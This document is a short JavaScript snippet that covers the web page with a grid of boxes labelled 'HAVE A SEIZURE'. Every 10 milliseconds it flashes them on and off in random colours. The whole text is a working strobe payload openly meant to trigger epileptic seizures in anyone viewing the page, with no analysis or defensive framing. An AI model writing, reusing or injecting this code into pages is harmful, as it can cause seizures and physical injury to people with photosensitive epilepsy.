var layers = [];
for(let i = 0;i<25;i++){
let myLayer = document.createElement('div');
myLayer.id = 'bookingLayer';
myLayer.style.position = 'absolute';
myLayer.style.left = (i%5) * 20 + '%';
myLayer.style.top = Math.floor(i/5) * 20 + '%';
myLayer.style.width = '20%';
myLayer.style.height = '20%';
myLayer.style.padding = '0px';
myLayer.style.background = '#000000';
myLayer.innerHTML = '.<h1 style="color:white;position:absolute;font-size:300%;">HAVE A SEIZURE</h1>';
myLayer.color = "white";
myLayer.hidden = i % 2;
myLayer.style.zIndex = 60000000000000;
layers.push(myLayer);
document.body.appendChild(myLayer);
}

setInterval(function() {
  for(let i = 0;i<layers.length;i++){
  let myLayery = layers[i];
	if(myLayery.hidden) {
		myLayery.hidden = false;
	} else {
		myLayery.hidden = true;
	}
	myLayery.style.background = 'rgb(' + Math.random() * 255 + ',' + Math.random() * 255 + ',' + Math.random() * 255 + ')';
	
  }
}, 10);

//source code
